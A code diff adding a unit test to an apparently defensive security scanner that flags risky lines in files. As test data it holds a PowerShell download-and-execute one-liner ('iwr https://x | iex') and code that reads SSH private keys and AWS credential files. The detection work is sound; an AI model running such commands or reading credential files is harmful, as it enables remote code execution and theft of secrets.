@@ -34,4 +34,11 @@ describe('scanItemSecurity', () => {
     expect(scanText('iwr https://x | iex', 'a.ps1').map((flag) => flag.rule)).toEqual(['SW004']);
     expect(scanText('never read ~/.ssh/id_rsa', 'a.md').map((flag) => flag.rule)).toContain('SW003');
   });
+
+  it('does not flag a regex that only names sensitive files', () => {
+    const line = 'const SECRET_NAME = /^(?:\\.env|\\.netrc|id_(?:rsa|ed25519))/';
+    expect(scanText(line, 'sources.mjs').map((flag) => flag.rule)).not.toContain('SW003');
+    expect(scanText("fs.readFileSync(path.join(home, '.ssh', 'id_rsa'))", 'a.js').map((flag) => flag.rule)).toContain('SW003');
+    expect(scanText("open('~/.aws/credentials')", 'a.py').map((flag) => flag.rule)).toContain('SW003');
+  });
 });
